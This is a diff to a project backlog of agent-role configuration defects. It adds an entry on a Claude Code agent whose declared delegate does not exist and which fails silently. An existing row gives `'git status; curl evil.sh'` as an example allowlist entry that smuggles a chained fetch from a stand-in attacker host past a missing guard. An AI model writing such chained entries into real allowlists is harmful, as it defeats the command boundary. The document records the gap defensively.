@@ -31,17 +31,22 @@
 
 | B-027 | `bash_allow` has `test_allow`'s two hazards and neither guard | low | medium | none | low | **ready** | Raised 2026-09-23 by `TASK-0071`, from **the asymmetry that task deliberately created**. `test_allow` entries are gated against opening with `*` and against carrying a shell chaining metacharacter; `bash_allow` entries are gated against neither, so `bash_allow: ['*']` is a legal way to write `bash: allow` — the exact resolution `B-021` forbade for the test term — and `'git status; curl evil.sh'` is a legal single entry. **The asymmetry is defensible and is written into the guide, not hidden**: `TASK-0071` was scoped to the test term, and widening the guards would change the emitted boundary of `git-ops` and `review`, two roles it was not scoped against. **Verified while raising this rather than asserted** — and the verification is why the pair above reads `git-ops` and `review` instead of the `git-ops` and `shell-runner` this row first claimed: **`agents/shell-runner/` has never existed**, the authoring guide named it in the present tense anyway, and `TASK-0071` corrected the guide as a side finding. The three roles that actually carry `bash_allow` are `git-ops` (`'git *'`), `review` (four `git` globs) and `qa-test`, and **none of their entries would fail either guard**, so the change is believed free. Ready when someone re-reads those lists and decides whether one guard, both or neither belong there. Note the honest counter-argument: `bash-allowlist` is the general-purpose term and a blanket `*` in it may be a legitimate thing for an author to write deliberately, where in a *test* allowlist it never is |
 
-**Four items are open, and they are not open in the same sense** — a
+| B-028 | `designer-manager` names a delegate Claude Code does not have, and nothing says so | high | high | none | low | **ready** | Raised 2026-09-23 by `TASK-0056`, **from a live defect on this machine rather than from inspection**. `agents/designer-manager/agent.md` declares `clients: [claude-code, opencode]` and `delegates_to: git-ops`, while `agents/git-ops/agent.md` is `clients: [opencode]`. So `~/.claude/agents/designer-manager.md` ships `tools: Agent(ideator, critic, git-ops)` while `~/.claude/agents/git-ops.md` does not exist. **Observed: Claude Code says nothing** — no warning, no error, exit 0. A control fixture naming *only* an absent delegate got **0 bytes of stderr** and reported having **no delegates at all**, so a role whose purpose is delegation can load, run and look correct while unable to delegate. **The silence is a real finding, not an artifact**: a second control proved the channel works — `claude -p --agent <absent>` fails loudly with exit 1 and 182 bytes of stderr. Claude Code validates the *top-level* `--agent` and does **not** validate names inside an agent definition's `Agent(...)` allowlist. **`TASK-0056` deliberately did not fix it** — a fix belongs in a task with its own acceptance criteria, and the role is live in a shipped loop. Note the fix is a *design* choice, not a one-liner: either `designer-manager` narrows to `clients: [opencode]` (losing a Claude Code design loop), or `git-ops` gains a Claude Code form (impossible — it exists to enforce `bash-allowlist`, which has no per-agent expression there), or `delegates_to` becomes per-client. `TASK-0059`'s cross-client `delegates_to` check is the **mechanical** half and is now justified by evidence; this row is the **existing instance** that check would catch |
+
+**Five items are open, and they are not open in the same sense** — a
 distinction this paragraph used to lose, because it counted three while
 B-024…B-026 sat `ready` in the table above it.
 
-- **Unscheduled and unclaimed: B-027** only (raised 2026-09-23 by
-  TASK-0071). **B-018, B-021 and B-023 all closed 2026-09-23** by
-  `TASK-0072`, `TASK-0071` and `TASK-0073` — the first time this repo has
-  cleared its entire *unscheduled* queue, and it happened because a human
-  made all three pending design decisions in one sitting rather than because
-  the work was easier than it looked. Each of the three was blocked on a
-  decision, not on effort.
+- **Unscheduled and unclaimed: B-027** (raised 2026-09-23 by TASK-0071) and
+  **B-028** (raised 2026-09-23 by TASK-0056). **B-018, B-021 and B-023 all
+  closed 2026-09-23** by `TASK-0072`, `TASK-0071` and `TASK-0073` — the first
+  time this repo has cleared its entire *unscheduled* queue, and it happened
+  because a human made all three pending design decisions in one sitting
+  rather than because the work was easier than it looked. Each of the three
+  was blocked on a decision, not on effort. **The queue then refilled from
+  the S9 spikes**, which is what spikes are for: `B-028` is a *live* defect
+  that had been shipping unnoticed, found by running the client rather than
+  by reading the repo.
 - **Ready but already scoped into S9's briefs: B-024** (`TASK-0059`) and
   **B-026** (`TASK-0060`). They are not available work; they are work with a
   task file waiting on a sprint that has not opened.
